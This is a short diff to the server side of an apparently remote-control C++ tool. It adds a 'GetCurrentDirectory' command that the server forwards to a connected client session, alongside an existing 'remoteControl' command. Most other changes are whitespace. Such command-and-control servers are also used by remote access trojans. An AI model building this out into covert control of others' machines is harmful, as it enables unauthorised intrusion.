@@ -3,6 +3,7 @@
 
 Server* Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
 
+
 Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on. BroadcastPublically = false if server is not open to the public (people outside of your router), true = server is open to everyone (assumes that the port is properly forwarded on router settings)
 {
 	//Winsock Startup
@@ -116,6 +117,13 @@ void Server::HandleInput()
 			{
 				SendString(currentSessionID, userinput, PacketType::Instruction);
 			}
+
+			else if (userinput == "GetCurrentDirectory")
+			{
+				SendString(currentSessionID, userinput, PacketType::Instruction);
+			}
+
+			
 
 			else if (userinput.find("remoteControl") != std::string::npos)
 			{
@@ -305,7 +313,7 @@ void Server::PacketSenderThread() //Thread for all outgoing packets
 }
 
 void Server::ListenerThread()
-{
+{	
 	while (true)
 	{
 		SOCKET newConnectionSocket = accept(serverptr->sListen, (SOCKADDR*)&serverptr->addr, &serverptr->addrlen); //Accept a new connection
@@ -315,6 +323,7 @@ void Server::ListenerThread()
 		}
 		else //If client connection properly accepted
 		{
+			
 			std::lock_guard<std::mutex> lock(serverptr->connectionMgr_mutex); //Lock connection manager mutex since we are adding an element to connection vector
 			int NewConnectionID = serverptr->connections.size(); //default new connection id to size of connections vector (we will change it if we can reuse an unused connection)
 			if (serverptr->UnusedConnections > 0) //If there is an unused connection that this client can use
